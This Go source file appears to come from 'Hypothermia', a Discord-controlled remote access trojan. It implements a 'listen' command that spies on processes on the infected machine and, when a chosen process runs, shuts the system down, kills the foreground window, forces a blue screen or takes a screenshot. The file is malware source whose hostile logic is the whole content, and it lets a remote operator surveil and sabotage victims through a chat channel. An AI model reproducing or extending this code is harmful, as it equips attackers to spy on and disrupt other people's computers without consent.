package commands

import (
	"fmt"
	"strings"

	"Hypothermia/src/misc"
	"Hypothermia/src/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	listenUsage string = "[proc name] [action]"

	listenArgsError   string = "🟥 Expected 2 arguments."
	listenActionError string = "🟥 Invalid action.\n\nActions: shutdown\nkill_fg\nbsod\nss"

	listenStopped string = "🟩 All listeners have been stopped."
	listenStarted string = "🟩 Listening for \"%s\" with action \"%s\"."
)

func (*ListenCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 1 && strings.ToLower(args[0]) == "stop" {
		utils.StopProcSpy()

		s.ChannelMessageSendReply(m.ChannelID, listenStopped, m.Reference())
		return
	}

	if len(args) != 2 {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.USAGE_F, bombArgsError, bombUsage), m.Reference())
		return
	}

	process := strings.ToLower(args[0])
	action := strings.ToLower(args[1])

	actions := map[string]bool{"shutdown": true, "kill_fg": true, "bsod": true, "ss": true}
	if !actions[action] {
		s.ChannelMessageSendReply(m.ChannelID, listenActionError, m.Reference())
		return
	}

	utils.ProcSpyMutex.Lock()
	utils.ProcSpyListeners[process] = action

	if !utils.ProcSpyActive {
		utils.ProcSpyStop = make(chan struct{})
		utils.ProcSpyActive = true
		go utils.StartProcSpy(s, m, utils.ProcSpyStop)
	}

	utils.ProcSpyMutex.Unlock()
	s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(listenStarted, process, action), m.Reference())
}

func (*ListenCommand) Name() string {
	return "listen"
}

func (*ListenCommand) Info() string {
	return "does something when a process starts or is active"
}

type ListenCommand struct{}
